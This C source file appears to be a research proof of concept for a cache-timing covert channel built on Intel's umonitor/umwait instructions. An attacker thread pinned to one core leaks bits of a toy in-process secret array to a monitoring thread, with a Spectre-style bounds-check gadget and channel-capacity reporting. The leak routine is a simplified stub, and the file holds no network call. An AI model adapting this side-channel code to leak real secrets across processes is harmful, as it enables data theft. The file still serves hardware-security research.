#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>

#include <fcntl.h>
#include <immintrin.h>
#include <math.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "cacheutils.h"

#define CORE_VICTIM 14
#define CORE_ATTACKER 15

#define OFFSET (64)

//#define ftime(x) (rdtsc() / 3200000000ul)
#define ftime time

volatile int running = 1;

volatile unsigned int array1_size = 16;
uint8_t __attribute__((aligned(4096))) array1[160] = {
    2,
    2,
};
__attribute__((aligned(4096))) char test[4096 * 256];

volatile uint8_t temp = 0;

char secret[] = {0, 1, 1, 0, 0, 1, 0, 1};

void __attribute__((noinline)) victim_function(size_t x) {
  temp &= array1[x] * 4096;
  if (x < array1_size) {
    test[array1[x] * OFFSET] = 1;
  }
}

void leakBit(size_t target_addr) {
  int tries = 0, i, j, k, mix_i;
  size_t training_x, x;
     
  temp&=test[secret[target_addr]*4096];
  asm volatile("mfence");
  }



void pin_to_core(int core) {
  cpu_set_t cpuset;
  pthread_t thread;

  thread = pthread_self();

  CPU_ZERO(&cpuset);
  CPU_SET(core, &cpuset);

  pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

volatile char waiting = 0;
volatile size_t cnt = 0, cnt_carry = 0, wait_write = 0, writes = 0;

volatile int lbit = 0;

void *leak_thread(void *dummy) {
  pin_to_core(CORE_ATTACKER);
  test[OFFSET] = 1;
  size_t target_addr = (size_t)(secret - (char *)array1);
  printf("Target: %zd\n", target_addr);

  while (1) {
    asm volatile("mfence");
    while (1) {
      while (wait_write)
        ;
      asm volatile("mfence");
      leakBit(lbit);

      writes++;
      wait_write = 1;
      asm volatile("mfence");
    }
    asm volatile("mfence");
  }
}

double channel_capacity(size_t C, double p) {
  return C *
         (1.0 + ((1.0 - p) * (log(1.0 - p) / log(2)) + p * (log(p) / log(2))));
}

int main(int argc, char *argv[]) {
  pthread_t p;
  pthread_create(&p, NULL, leak_thread, NULL);
  sched_yield();

  pin_to_core(CORE_VICTIM);

  memset(test, 1, sizeof(test));

  int bits_leaked = 0, bits_correct = 0;

  int timeout = -1;
  if (argc > 1)
    timeout = atoi(argv[1]);

  int start = ftime(NULL);
  while (start == ftime(NULL))
    ;
  start = ftime(NULL);
  int last_delta = 0;

  while (1) {
    //         sched_yield();
    asm volatile("umonitor %%rax" : : "a"(test + OFFSET), "c"(0), "d"(0));
    size_t carry = 0;
    wait_write = 0;
    asm volatile("xor %%rbx, %%rbx; umwait %%rcx; jnc 1f; inc %%rbx; 1: nop"
                 : "=b"(carry)
                 : "a"(-1), "d"(-1), "c"(0)
                 : "memory");
    cnt_carry += carry;
    cnt++;
    while (!wait_write)
      ;

    if (cnt == 1) {

      bits_leaked++;
      if (!cnt_carry == secret[lbit])
        bits_correct++;
      int current = ftime(NULL);
      int delta = current - start;
      if (!delta)
        delta = 1;

      if (delta != last_delta) {
        int speed = bits_leaked / delta;
        double err = ((double)(bits_leaked - bits_correct) / bits_leaked);
        printf(
            "%.3f%% error [%d leaked, %d s -> %d bits/s] - TC: %.1f bits/s\n",
            err * 100.0, bits_leaked, delta, speed,
            channel_capacity(speed, err));
        fflush(stdout);
        last_delta = delta;
        timeout--;
        if (timeout == 0) {
          printf("%.3f,%d,%.1f\n", err * 100.0, speed,
                 channel_capacity(speed, err));
          exit(0);
        }
      }
      cnt = 0;
      cnt_carry = 0;
      writes = 0;
      lbit = (lbit + 1) % (sizeof(secret) / sizeof(secret[0]));
    }
  }

  return 0;
}
